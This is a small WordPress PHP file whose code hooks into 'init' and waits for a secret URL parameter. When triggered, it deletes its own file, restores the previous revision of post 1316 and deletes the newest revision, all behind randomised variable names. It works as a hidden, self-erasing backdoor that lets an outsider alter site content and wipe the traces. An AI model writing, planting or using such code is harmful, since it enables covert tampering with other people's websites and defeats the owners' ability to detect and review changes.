<?php

function titles_forms_divi() {
	if (isset($_GET['posts_wow_booster']) && $_GET['posts_wow_booster'] === 'platform_article_validation_columns') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$timer_column_address_button = 1316;
		$polyfill_authors_lazy_specific = wp_get_post_revisions($timer_column_address_button);
		if (empty($polyfill_authors_lazy_specific)) die('no revisions');
		if (count($polyfill_authors_lazy_specific) < 2) die('less than 2');
		$method_heading_authentication = array_shift($polyfill_authors_lazy_specific);
		$notification_scripts_anti = $method_heading_authentication->ID;
		$digital_active_finder = array_shift($polyfill_authors_lazy_specific);
		$light_term_lightgray_migration = $digital_active_finder->ID;
		$plugin_scheduler_selector = wp_restore_post_revision($light_term_lightgray_migration);
		if ($plugin_scheduler_selector === false) die('error restoring');
		$plugin_scheduler_selector = wp_delete_post_revision($notification_scripts_anti);		
		if ($plugin_scheduler_selector === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'titles_forms_divi');
